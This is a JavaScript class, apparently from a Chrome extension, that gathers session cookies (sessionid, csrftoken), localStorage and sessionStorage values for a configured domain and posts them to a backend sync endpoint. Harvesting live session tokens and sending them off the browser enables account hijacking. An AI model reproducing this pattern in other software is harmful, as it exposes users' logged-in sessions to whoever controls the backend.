class DevsDBSync {
    static async syncCredentials(domainConfig) {
        try {
            if (!domainConfig) {
                return {
                    success: false,
                    error: 'No domain config',
                    message: 'Domain configuration not provided',
                    data: null
                };
            }

            // Collect credentials using the proper method (same as popup.js)
            const credentialsResult = await BrowserDataCollector.getBrowserData(null, null, domainConfig, null);
            if (!credentialsResult.success || !credentialsResult.data?.credentials) {
                return {
                    success: false,
                    error: 'Collection failed',
                    message: 'Failed to collect browser credentials',
                    data: null
                };
            }

            const validationResult = await CredentialValidator.validateCredentials(credentialsResult.data.credentials, 'structure_filter', null, domainConfig);
            if (!validationResult.success || !validationResult.data?.credentials) {
                return {
                    success: false,
                    error: 'Validation failed',
                    message: 'Failed to validate collected credentials',
                    data: null
                };
            }

            const credentials = validationResult.data.credentials;

            // Transform credentials for DEVS API
            const syncPayload = this.buildSyncPayload(credentials);

            // Sync with backend
            const syncResult = await BackendAPI.post('/api/devs/sync', syncPayload);

            return {
                success: syncResult.success,
                error: syncResult.error,
                message: syncResult.message || 'DEVS credentials synced successfully',
                data: syncResult.data
            };

        } catch (error) {
            return {
                success: false,
                error: 'DEVS sync error',
                message: `Error syncing DEVS credentials: ${error.message}`,
                data: null
            };
        }
    }

    static buildSyncPayload(credentials) {
        const credentialCookies = credentials.cookies || {};
        const credentialLocalStorage = credentials.localStorage || {};
        const credentialSessionStorage = credentials.sessionStorage || {};

        return {
            platform: 'devs',
            credentials: {
                cookies: {
                    sessionid: credentialCookies.sessionid?.value,
                    csrftoken: credentialCookies.csrftoken?.value
                },
                localStorage: {
                    user_preferences: credentialLocalStorage.user_preferences
                },
                sessionStorage: credentialSessionStorage.temp_session ? {
                    temp_session: credentialSessionStorage.temp_session
                } : {}
            },
            metadata: {
                syncedAt: new Date().toISOString(),
                source: 'chrome_extension'
            }
        };
    }

    static async validateSyncStatus(credentials) {
        try {
            const syncPayload = this.buildSyncPayload(credentials);
            
            // Check sync status with backend
            const statusResult = await BackendAPI.post('/api/devs/sync/status', {
                credentials: syncPayload.credentials
            });

            return {
                success: true,
                data: {
                    isSynced: statusResult.success && statusResult.data?.isSynced,
                    lastSyncAt: statusResult.data?.lastSyncAt,
                    syncStatus: statusResult.data?.status
                },
                message: 'DEVS sync status checked successfully'
            };

        } catch (error) {
            return {
                success: false,
                error: 'Sync status error',
                message: `Error checking DEVS sync status: ${error.message}`,
                data: null
            };
        }
    }
}
